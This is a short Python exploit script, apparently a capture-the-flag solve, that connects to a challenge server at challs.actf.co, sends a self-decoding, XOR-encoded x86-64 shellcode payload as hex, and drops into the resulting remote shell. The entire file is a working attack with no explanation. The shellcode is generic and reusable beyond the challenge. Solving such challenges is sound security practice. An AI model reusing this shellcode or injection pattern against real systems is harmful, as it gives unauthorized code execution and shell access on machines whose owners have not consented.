#!/usr/bin/env python
import ptrlib as ptr
import sys

# elf = ptr.ELF("")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    # if len(sys.argv) > 1 and sys.argv[1] == "remote":
    return ptr.Socket("challs.actf.co", 31200)


# else:
# return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()
    buf = b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
    buf += b"\x05\xef\xff\xff\xff\x48\xbb\xd0\xe6\x01\xcd\xfc"
    buf += b"\x48\xe4\xe0\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    buf += b"\xff\xe2\xf4\x98\x5e\x2e\xaf\x95\x26\xcb\x93\xb8"
    buf += b"\xe6\x98\x9d\xa8\x17\xb6\x86\xb8\xcb\x62\x99\xa2"
    buf += b"\x1a\x0c\xe8\xd0\xe6\x01\xe2\x9e\x21\x8a\xcf\xa3"
    buf += b"\x8e\x01\x9b\xab\x1c\xba\x8a\xeb\xbe\x0e\xc8\xfc"
    buf += b"\x48\xe4\xe0"

    io.sendline(buf.hex())

    io.sh()


if __name__ == "__main__":
    main()
